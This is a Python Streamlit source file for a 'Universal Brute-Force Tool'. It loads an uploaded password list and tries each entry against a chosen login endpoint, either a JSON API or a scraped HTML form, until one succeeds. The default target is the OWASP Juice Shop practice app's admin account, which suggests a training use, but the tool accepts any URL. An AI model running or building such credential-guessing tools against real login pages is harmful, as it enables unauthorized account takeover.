import streamlit as st
import requests
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup

# ——————————————————————————————————————————————————————————————————
# Streamlit page config + CSS
# ——————————————————————————————————————————————————————————————————
st.set_page_config(page_title="Passowrds Brute-Forcing", layout="wide")
st.markdown("""
    <style>
    .stButton>button { background-color:#0f3460; color:white; border-radius:5px; padding:8px 16px; }
    .stButton>button:hover { background-color:#1e5f74; }
    .title { font-size:32px; font-weight:bold; color:#00d4ff; text-align:center; margin-bottom:20px; }
    </style>
""", unsafe_allow_html=True)

st.markdown('<div class="title">Universal Brute-Force Tool</div>', unsafe_allow_html=True)

# ——————————————————————————————————————————————————————————————————
# Sidebar inputs
# ——————————————————————————————————————————————————————————————————
method = st.sidebar.selectbox("Method", ["JSON API", "HTML Form"])

if method == "JSON API":
    json_url         = st.sidebar.text_input("JSON Login URL", "https://juice-shop.herokuapp.com/rest/user/login")
    json_user_field  = st.sidebar.text_input("JSON User Field", "email")
    json_pwd_field   = st.sidebar.text_input("JSON Password Field", "password")
    username         = st.sidebar.text_input("Username / Email", "admin@juice-sh.op")
else:
    form_url         = st.sidebar.text_input("Form Page URL", "http://example.com/login")
    form_user_field  = st.sidebar.text_input("Form: username field name", "UserName")
    form_pwd_field   = st.sidebar.text_input("Form: password field name", "Password")
    username         = st.sidebar.text_input("Username", "testuser")
    error_marker     = st.sidebar.text_input("Error marker text", "Invalid credentials",
                                             help="If this string appears, login failed")

pw_file = st.sidebar.file_uploader("Password list (.txt)", type="txt")

# ——————————————————————————————————————————————————————————————————
# Universal brute-forcer class
# ——————————————————————————————————————————————————————————————————
class UniversalBruteForcer:
    def __init__(self, session: requests.Session):
        self.session = session

    def prepare_form(self, url: str, user_field: str, pwd_field: str, user: str, pwd: str):
        """Fetch & parse login form; inject credentials."""
        r = self.session.get(url, timeout=5)
        r.raise_for_status()

        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")
        action = form.get("action") or url
        post_url = urljoin(url, action)

        payload = {
            inp["name"]: inp.get("value", "")
            for inp in form.find_all("input", attrs={"name": True})
        }
        payload[user_field] = user
        payload[pwd_field]  = pwd

        return post_url, payload

    def attempt_login(self, user: str, pwd: str):
        """Perform one login attempt; returns (success, message)."""
        if method == "JSON API":
            data = {json_user_field: user, json_pwd_field: pwd}
            headers = {"Content-Type": "application/json"}
            try:
                resp = self.session.post(json_url, json=data, headers=headers, timeout=5)
            except requests.RequestException as e:
                return False, f"Network error: {e}"
            return (resp.status_code == 200), f"HTTP {resp.status_code}"

        # HTML form path
        try:
            post_url, payload = self.prepare_form(form_url, form_user_field, form_pwd_field, user, pwd)
            resp = self.session.post(post_url, data=payload, timeout=5)
        except requests.RequestException as e:
            return False, f"Network error: {e}"

        # success if redirected or error_marker missing
        if resp.url != form_url or error_marker not in resp.text:
            return True, f"Redirected to {resp.url}"
        return False, "Error marker found"

# ——————————————————————————————————————————————————————————————————
# Brute-force loop
# ——————————————————————————————————————————————————————————————————
if st.button("🚀 Start Brute-Force"):
    if not pw_file:
        st.error("Please upload a password list.")
    else:
        pw_list = pw_file.read().decode("utf-8", errors="ignore").splitlines()
        bruteforcer = UniversalBruteForcer(requests.Session())

        progress = st.progress(0)
        status   = st.empty()
        result   = st.empty()

        total = len(pw_list)
        for i, pwd in enumerate(pw_list, start=1):
            progress.progress(i / total)
            status.write(f"Attempt {i}/{total}: {pwd!r}")

            ok, msg = bruteforcer.attempt_login(username, pwd)
            if ok:
                result.success(f"🎉 Success! username={username!r} password={pwd!r}")
                result.write(f"Detail: {msg}")
                break
            else:
                status.write(f"✖️ {msg}")
            time.sleep(0.2)  # throttle

        else:
            result.error("❌ No password matched.")
            result.write(f"Tried {total} passwords.")